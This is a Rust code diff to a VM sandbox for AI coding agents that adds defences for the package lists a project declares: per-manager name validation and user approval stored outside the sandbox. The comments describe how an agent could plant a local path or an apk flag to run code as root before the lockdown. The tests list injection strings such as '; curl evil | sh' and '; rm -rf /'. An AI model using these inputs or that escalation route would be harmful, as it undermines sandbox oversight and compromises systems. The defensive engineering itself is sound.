@@ -95,6 +95,13 @@ struct WorkspaceConfig {
     /// Extra hosts these directories may reach when `--restrict-net` is on.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     allow: Vec<String>,
+    /// Per directory, the digest of the package list the user approved there.
+    ///
+    /// **Here rather than in the project, which is the whole point.** The list lives in
+    /// `.geli.json`, which the sandbox may write; the approval of that list lives where the
+    /// sandbox cannot reach. A project that changes its list gets asked again.
+    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
+    approved_packages: BTreeMap<String, String>,
 }
 
 /// Tools a project declares it needs inside the sandbox, by package manager.
@@ -130,27 +137,105 @@ impl Packages {
     }
 }
 
-/// Characters a package name may contain. Everything a shell would read as syntax is absent:
-/// no spaces, no `;`, `|`, `&`, `$`, backticks, quotes, newlines, and no `<` or `>` — which rules
-/// out apk's and pip's `>=` version constraints along with redirection, since no charset can tell
-/// them apart. `=` survives, so `ripgrep=14.1.0` still works.
+/// Characters a package name may contain whatever installs it. Everything a shell would read as
+/// syntax is absent: no spaces, no `;`, `|`, `&`, `$`, backticks, quotes, newlines, and no `<` or
+/// `>` — which rules out apk's and pip's `>=` version constraints along with redirection, since no
+/// charset can tell them apart. `=` survives, so `ripgrep=14.1.0` still works.
 ///
 /// **This matters because `.geli.json` is not a trusted file.** It lives in the project
 /// directory, so it can arrive inside a cloned repository, and these names go into a root shell.
-/// The damage would be confined to the VM, which is what the VM is for — but leaving an injection
-/// open because it is contained is the kind of shortcut that ages badly.
-fn valid_package_name(name: &str) -> bool {
-    !name.is_empty()
-        && name.chars().all(|c| {
-            c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | '@' | '/' | '=')
-        })
+fn valid_package_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | '@' | '/' | '=')
 }
 
-/// The declared names a shell must never see, in the order they were written.
+/// Whether a manager would read this name as a **place** rather than a package.
+///
+/// **This, not shell syntax, is what the charset above was missing.** The names are shell-quoted
+/// before they reach the guest, so `;` was never getting through. What was getting through is
+/// `npm install -g /workspace/proyecto/evil`: a local path, whose install script runs **as root
+/// and before the lockdown exists**, because declared packages go in while there is still a route
+/// (`build_package_setup`, and the ordering comment in `build_mount_script`). The agent can write
+/// `.geli.json` — that is deliberate, it is how a session hands work to the next one — so a path
+/// here is a way to leave root waiting for tomorrow. `CLAUDE.md` says nothing in that file may
+/// grant anything; this is what made that false.
+/// → `docs/plans/10-paquetes-token-y-lo-que-no-se-puede-comprobar.md`
+fn looks_like_a_path(name: &str) -> bool {
+    name.starts_with('.')
+        || name.starts_with('/')
+        || name.starts_with('~')
+        || name.contains("..")
+        || name.contains('/')
+}
+
+/// Whether `manager` would accept this name as the name of a package.
+///
+/// **One rule per manager, because they do not want the same thing.** npm genuinely needs a slash
+/// — `@scope/name` is how half of npm is published — and it is the only one that does, so it is
+/// the only one that gets it, and only in that shape. apk and pip never need one, so for them a
+/// slash is always someone trying to install a directory.
+fn valid_package_name(manager: &str, name: &str) -> bool {
+    if name.is_empty() || !name.chars().all(valid_package_char) {
+        return false;
+    }
+    // A name starting with `-` is not a package, it is an option: each entry becomes its own
+    // argument, so `--allow-untrusted` would reach apk as a flag rather than as something to
+    // install. No package manager has a package whose name starts with a dash.
+    if name.starts_with('-') {
+        return false;
+    }
+
+    match manager {
+        // `@scope/name`: one leading `@`, one slash, something on each side of it. Checked as a
+        // whole shape rather than character by character, which is what lets the slash in without
+        // letting `./x` or `a/../b` in with it.
+        "npm" => match name.strip_prefix('@') {
+            Some(scoped) => match scoped.split_once('/') {
+                Some((scope, rest)) => {
+                    !scope.is_empty() && !rest.is_empty() && !looks_like_a_path(scope)
+                        && !looks_like_a_path(rest)
+                }
+                None => !looks_like_a_path(scoped),
+            },
+            None => !looks_like_a_path(name),
+        },
+        _ => !looks_like_a_path(name),
+    }
+}
+
+/// A digest of exactly the package list, and nothing else about the project.
+///
+/// **SHA-256 rather than the `DefaultHasher` `recipe_hash` uses.** That one answers "did this
+/// change", where a collision costs a needless rebuild. This one answers "did the user agree to
+/// this", where a collision is a hostile list wearing an approved list's name. `sha2` is already
+/// in the tree — `ssh-key` re-exports it — so the stronger answer is free.
+///
+/// Order and duplicates are normalised away: a list someone reordered is the same list, and asking
+/// again for it would teach the user to say yes without reading.
+fn packages_digest(packages: &Packages) -> String {
+    use ssh_key::sha2::{Digest, Sha256};
+
+    let mut hasher = Sha256::new();
+    for (manager, names) in [("apk", &packages.apk), ("npm", &packages.npm), ("pip", &packages.pip)]
+    {
+        let mut sorted: Vec<&str> = names.iter().map(String::as_str).collect();
+        sorted.sort_unstable();
+        sorted.dedup();
+        for name in sorted {
+            // Length-prefixed, so ["ab","c"] and ["a","bc"] cannot hash alike.
+            hasher.update(manager.as_bytes());
+            hasher.update(b"\0");
+            hasher.update((name.len() as u64).to_be_bytes());
+            hasher.update(name.as_bytes());
+        }
+    }
+    format!("{:x}", hasher.finalize())
+}
+
+/// The declared names geli will not install, in the order they were written.
 fn rejected_package_names(packages: &Packages) -> Vec<String> {
     packages
         .listed()
-        .filter(|(_, name)| !valid_package_name(name))
+        .filter(|(manager, name)| !valid_package_name(manager, name))
         .map(|(manager, name)| format!("{}: {}", manager, name))
         .collect()
 }
@@ -435,16 +520,18 @@ pub(crate) fn parse_installed_packages(log: &str) -> Packages {
         let (Some(manager), Some(name), None) = (parts.next(), parts.next(), parts.next()) else {
             continue;
         };
-        if !valid_package_name(name) {
-            continue;
-        }
-
+        // The manager decides what a name may look like, so it is read first. A discovery that
+        // would be refused on the way in must not get in by this door either: what lands here is
+        // offered for `.geli.json`, which is where the next session reads it from.
         let list = match manager {
             "apk" => &mut found.apk,
             "npm" => &mut found.npm,
             "pip" => &mut found.pip,
             _ => continue,
         };
+        if !valid_package_name(manager, name) {
+            continue;
+        }
         // The guest already sorts and uniques, but a log can be read twice and a line can repeat.
         if !list.iter().any(|p| p == name) {
             list.push(name.to_string());
@@ -490,7 +577,12 @@ fn parse_selection(answer: &str, count: usize) -> Option<Vec<usize>> {
 ///
 /// On **stderr**, like the rest of what geli says about itself: this runs after the command has
 /// finished, and `geli claude > out.txt` must still capture the command and nothing else.
-fn offer_to_persist_packages(current_dir: &Path, declared: &Packages, log: &str) -> io::Result<()> {
+fn offer_to_persist_packages(
+    workspace: &str,
+    current_dir: &Path,
+    declared: &Packages,
+    log: &str,
+) -> io::Result<()> {
     let found = undeclared_packages(&parse_installed_packages(log), declared);
     if found.is_empty() {
         return Ok(());
@@ -565,10 +657,80 @@ fn offer_to_persist_packages(current_dir: &Path, declared: &Packages, log: &str)
 
     if changed {
         save_local_packages(current_dir, &keep)?;
+        // The user just said yes to these, one by one. Leaving the approval behind would ask
+        // again next session for the very list they chose here, and a question that always fires
+        // is a question people stop reading.
+        remember_package_approval(workspace, current_dir, &keep)?;
         eprintln!("[+] Saved to .geli.json. The next session installs them before the agent runs.");
     }
 
     Ok(())
+}
+
+/// Record that the user agreed to this exact list for this directory.
+///
+/// In the registry, never in the project: an approval a project could write for itself is not an
+/// approval. Missing workspace or unreadable registry is not fatal — the worst case is being
+/// asked again, and refusing to run over it would be worse than the question.
+fn remember_package_approval(workspace: &str, dir: &Path, packages: &Packages) -> io::Result<()> {
+    let mut config = read_workspace(workspace)?.unwrap_or_default();
+    config
+        .approved_packages
+        .insert(approval_key(dir), packages_digest(packages));
+    write_workspace(workspace, &config)
+}
+
+/// How a directory is named in the approval map. Canonical where possible, so the same project
+/// reached through a symlink is the same project.
+fn approval_key(dir: &Path) -> String {
+    dir.canonicalize().unwrap_or_else(|_| dir.to_path_buf()).display().to_string()
+}
+
+/// The declared packages, once the user has said they are theirs.
+///
+/// **The list is in the project; the approval is not.** `.geli.json` is mounted writable on
+/// purpose — it is how a session hands work to the next one — so a package list is a proposal
+/// from inside the sandbox as much as from the user. The validator stops a name that is a path or
+/// an option; this stops the ordinary-looking name nobody chose. They are different holes: one is
+/// a shape, this one is consent.
+///
+/// Not a terminal means **not installing**, and saying so. Prompting into a pipe would hang or
+/// read someone else's keystrokes, and silently installing instead would make the gate decorative
+/// in exactly the place — CI — where nobody is watching.
+fn approved_packages(workspace: &str, dir: &Path, declared: &Packages) -> io::Result<Packages> {
+    if declared.is_empty() {
+        return Ok(Packages::default());
+    }
+
+    let digest = packages_digest(declared);
+    let config = read_workspace(workspace)?.unwrap_or_default();
+    if config.approved_packages.get(&approval_key(dir)).is_some_and(|seen| *seen == digest) {
+        return Ok(declared.clone());
+    }
+
+    eprintln!("\ngeli · {} declares packages this workspace has not approved:", LOCAL_CONFIG_FILE);
+    for (manager, name) in declared.listed() {
+        eprintln!("    {} {}", manager, name);
+    }
+    eprintln!("    They install as root, before the sandbox loses its network.");
+
+    if !io::stdin().is_terminal() {
+        eprintln!("geli · not a terminal, so they are skipped. Run geli here once to approve.");
+        return Ok(Packages::default());
+    }
+
+    eprint!("[?] Install them in this workspace from now on? (y/N): ");
+    io::stderr().flush()?;
+    let mut answer = String::new();
+    io::stdin().lock().read_line(&mut answer)?;
+
+    if !matches!(answer.trim().to_lowercase().as_str(), "y" | "yes") {
+        eprintln!("geli · skipped. The session runs without them.");
+        return Ok(Packages::default());
+    }
+
+    remember_package_approval(workspace, dir, declared)?;
+    Ok(declared.clone())
 }
 
 /// Merge a package set into the project's `.geli.json`, leaving every other field alone.
@@ -1445,20 +1607,34 @@ fn execute_sandbox(
     fs::create_dir_all(&pip_cache)?;
     fs::create_dir_all(&apk_cache)?;
 
-    // Read before anything is built: a name that cannot be shown to a shell should stop the run
-    // here, with the offending entry on screen, rather than after a VM has booted.
+    // Read before anything is built: a name geli will not install should stop the run here, with
+    // the offending entry on screen, rather than after a VM has booted.
     let rejected = rejected_package_names(packages);
     if !rejected.is_empty() {
         eprintln!(
-            "[!] {} in {} contains package names geli will not pass to a shell:\n\
+            "[!] {} in {} declares package names geli will not install:\n\
              \x20     {}\n\
-             \x20   Names may hold letters, digits and - _ . + @ / = and nothing else.",
+             \x20   A name may hold letters, digits and - _ . + @ = — and must be a package: not\n\
+             \x20   a place (no leading . / or ~, no path; npm may use one @scope/name slash),\n\
+             \x20   and not an option (nothing starting with -).\n\
+             \x20   These are installed as root before the sandbox loses its network, so a local\n\
+             \x20   directory here would run its install script with both.",
             LOCAL_CONFIG_FILE,
             cur.display(),
             rejected.join("\n      ")
         );
         std::process::exit(1);
     }
+
+    // Consent, after shape. Still before the scratch files exist, so the prompt may be answered
+    // with Ctrl-C without leaving an overlay behind — nothing between the scratch and the end of
+    // the session may leave the process.
+    //
+    // **A separate binding, not a shadow of `packages`.** What gets installed is the approved
+    // set; what the end-of-session prompt merges into is the project's own declared list. Letting
+    // the second be the first means a user who declines the approval and then keeps a discovered
+    // package writes their whole declared list out of `.geli.json`.
+    let to_install = approved_packages(ws, cur, packages)?;
 
     let vm_share_dir = staging_dir(&format!("sandbox-share-{}", pid))?;
     let sandbox_img = PathBuf::from(format!("/tmp/sandbox-session-{}.qcow2", pid));
@@ -1494,7 +1670,7 @@ fn execute_sandbox(
     let plan = build_mount_script(
         &dirs,
         &cur_canon,
-        &build_package_setup(packages),
+        &build_package_setup(&to_install),
         &build_agent_relay(agent_port),
         &build_lockdown(proxy_port),
     );
@@ -1635,7 +1811,7 @@ fn execute_sandbox(
             &credentials.iter().map(|(p, _)| p.clone()).collect::<Vec<_>>(),
             &describe_image(&meta),
             &net,
-            &describe_packages(packages, restrict_net),
+            &describe_packages(&to_install, restrict_net),
         )
     );
 
@@ -1736,6 +1912,7 @@ fn execute_sandbox(
     // Before the cleanup below: the report arrives on the boot console, and that log lives in the
     // share directory this function is about to delete.
     if let Err(e) = offer_to_persist_packages(
+        ws,
         cur,
         packages,
         &fs::read_to_string(&console_log).unwrap_or_default(),
@@ -1796,11 +1973,15 @@ mod tests {
     #[test]
     fn package_names_reject_shell_metacharacters() {
         for bad in ["; curl evil | sh", "a b", "$(id)", "`id`", "x>y", "foo&", ""] {
-            assert!(!valid_package_name(bad), "{:?} was accepted", bad);
+            for manager in ["apk", "npm", "pip"] {
+                assert!(!valid_package_name(manager, bad), "{:?} was accepted", bad);
+            }
         }
         // Real names, including scoped npm packages and pinned apk versions, must survive.
-        for good in ["ripgrep", "py3-pip", "@scope/pkg", "ripgrep=14.1.0", "a_b.c+d"] {
-            assert!(valid_package_name(good), "{:?} was rejected", good);
+        for good in ["ripgrep", "py3-pip", "ripgrep=14.1.0", "a_b.c+d"] {
+            for manager in ["apk", "npm", "pip"] {
+                assert!(valid_package_name(manager, good), "{:?} was rejected", good);
+            }
         }
 
         let rejected = rejected_package_names(&Packages {
@@ -1809,6 +1990,111 @@ mod tests {
             pip: vec!["also bad".into()],
         });
         assert_eq!(rejected, vec!["apk: ; rm -rf /", "pip: also bad"]);
+    }
+
+    /// **A name that is a place, not a package.** `npm install -g ./evil` runs that directory's
+    /// install script as root, before the lockdown, from a file the agent is allowed to write.
+    /// The shell quoting never stopped it, because there is no shell syntax in a path.
+    /// Each entry becomes its own argument, so a name that starts with a dash is an option the
+    /// project got to choose for a root `apk add`.
+    #[test]
+    fn a_package_name_may_not_be_an_option() {
+        for flag in ["--allow-untrusted", "-g", "--no-scripts", "-t"] {
+            for manager in ["apk", "npm", "pip"] {
+                assert!(
+                    !valid_package_name(manager, flag),
+                    "{} accepted {:?} as a package",
+                    manager,
+                    flag
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn a_package_name_may_not_be_a_path() {
+        for place in ["./evil", "/workspace/proj", "../up", "~/mine", "a/../b", "sub/dir"] {
+            for manager in ["apk", "npm", "pip"] {
+                assert!(
+                    !valid_package_name(manager, place),
+                    "{} accepted {:?} as a package",
+                    manager,
+                    place
+                );
+            }
+        }
+    }
+
+    /// The slash npm cannot do without, and nobody else gets. Half of npm is published under a
+    /// scope, so refusing `@scope/name` outright would make the field useless for it.
+    #[test]
+    fn only_npm_gets_the_scope_slash() {
+        assert!(valid_package_name("npm", "@scope/pkg"));
+        assert!(valid_package_name("npm", "@babel/core"));
+        assert!(!valid_package_name("apk", "@scope/pkg"));
+        assert!(!valid_package_name("pip", "@scope/pkg"));
+
+        // A slash is not a licence for a path, and `@` is not a licence for a second slash.
+        for bad in ["@scope/../etc", "@/pkg", "@scope/", "@scope/a/b", "@./pkg"] {
+            assert!(!valid_package_name("npm", bad), "npm accepted {:?}", bad);
+        }
+
+        // apk's tagged repository still works: `@edge` is a suffix, not a path.
+        assert!(valid_package_name("apk", "ripgrep@edge"));
+    }
+
+    /// The approval is of a *set*, not of a line in a file. A list someone reordered is the same
+    /// list, and asking again for it teaches people to answer without reading.
+    #[test]
+    fn the_approval_follows_the_packages_and_not_their_order() {
+        let one = Packages {
+            apk: vec!["ripgrep".into(), "fd".into()],
+            npm: vec!["prettier".into()],
+            pip: Vec::new(),
+        };
+        let reordered = Packages {
+            apk: vec!["fd".into(), "ripgrep".into(), "fd".into()],
+            npm: vec!["prettier".into()],
+            pip: Vec::new(),
+        };
+        assert_eq!(packages_digest(&one), packages_digest(&reordered));
+
+        // One package more is a different list, and gets asked about.
+        let grown = Packages { apk: vec!["ripgrep".into(), "fd".into(), "jq".into()], ..one.clone() };
+        assert_ne!(packages_digest(&one), packages_digest(&grown));
+
+        // The same name under a different manager is a different list too.
+        let moved = Packages { apk: vec!["ripgrep".into()], npm: vec!["fd".into()], pip: vec![] };
+        let other = Packages { apk: vec!["ripgrep".into(), "fd".into()], npm: vec![], pip: vec![] };
+        assert_ne!(packages_digest(&moved), packages_digest(&other));
+
+        // And the join cannot be ambiguous: ["ab","c"] is not ["a","bc"].
+        let ab_c = Packages { apk: vec!["ab".into(), "c".into()], ..Default::default() };
+        let a_bc = Packages { apk: vec!["a".into(), "bc".into()], ..Default::default() };
+        assert_ne!(packages_digest(&ab_c), packages_digest(&a_bc));
+    }
+
+    /// The approval lives in the registry, which the sandbox cannot write. If it ever moves into
+    /// the project file, a project approves itself and the gate is decoration.
+    #[test]
+    fn the_approval_is_not_a_field_a_project_can_set() {
+        let local: LocalConfig = serde_json::from_str(
+            r#"{"packages":{"apk":["ripgrep"]},"approved_packages":{"/tmp/x":"deadbeef"}}"#,
+        )
+        .unwrap();
+        let rendered = serde_json::to_string(&local).unwrap();
+        assert!(
+            !rendered.contains("approved"),
+            "a project file carried an approval: {}",
+            rendered
+        );
+
+        // And it round-trips in the registry, where it belongs.
+        let mut registry = WorkspaceConfig::default();
+        registry.approved_packages.insert("/tmp/x".into(), "deadbeef".into());
+        let back: WorkspaceConfig =
+            serde_json::from_str(&serde_json::to_string(&registry).unwrap()).unwrap();
+        assert_eq!(back.approved_packages.get("/tmp/x").map(String::as_str), Some("deadbeef"));
     }
 
     /// The `.geli.json` files already on disk predate this field and must keep loading, the same
@@ -2129,6 +2415,7 @@ geli:ready\n";
             dirs: vec![PathBuf::from("/home/u/a"), PathBuf::from("/home/u/b")],
             ssh: true,
             allow: vec!["a.test".to_string()],
+            approved_packages: BTreeMap::new(),
         };
         let raw = serde_json::to_string(&cfg).unwrap();
         let back: WorkspaceConfig = serde_json::from_str(&raw).unwrap();
